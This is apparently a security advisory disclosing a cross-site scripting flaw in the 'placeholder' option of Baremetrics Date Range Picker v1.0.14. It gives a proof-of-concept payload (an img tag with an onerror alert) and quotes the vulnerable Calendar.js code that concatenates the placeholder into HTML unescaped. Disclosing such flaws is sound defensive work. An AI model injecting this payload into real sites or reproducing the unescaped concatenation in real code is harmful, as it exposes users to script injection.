## Summary

Baremetrics Date Range Picker is prone to Cross-site scripting (XSS) when handling untrusted `placeholder` entries.

## Product

Baremetrics Date Range Picker

## Tested Version

[v1.0.14](https://github.com/Baremetrics/calendar/releases/tag/v1.0.14)

## Details

### Issue 1: XSS in `placeholder` (`GHSL-2021-1042`)

An attacker who is able to influence the field `placeholder` when creating a `Calendar` instance is able to supply arbitrary `html` or `javascript` that will be rendered in the context of a user leading to XSS.

*Proof of concept snippet:*

```
var ss = new Calendar({
  element: $('.daterange--single'),
  format: {input: 'YYYY'},
  placeholder: 'Foobar"> <img src="foobar" onerror="alert(3)" /><',
  required: false,
  callback: function() {
    console.log('Single calendar callback triggered');
  }
});

```

*Vulnerable code:* [Calendar.js](https://github.com/Baremetrics/calendar/blob/240c20134ffbf0f0f246a50feff2be1ff19cf349/public/js/Calendar.js#L724)

```
    return this.element.append('<div class="dr-input">' +
      '<div class="dr-dates">' +
        '<div class="dr-date" contenteditable placeholder="'+ this.placeholder +'">'+ (this.settings.current_date ? moment(this.current_date).format(this.format.input) : '') +'</div>' +
      '</div>' +

```
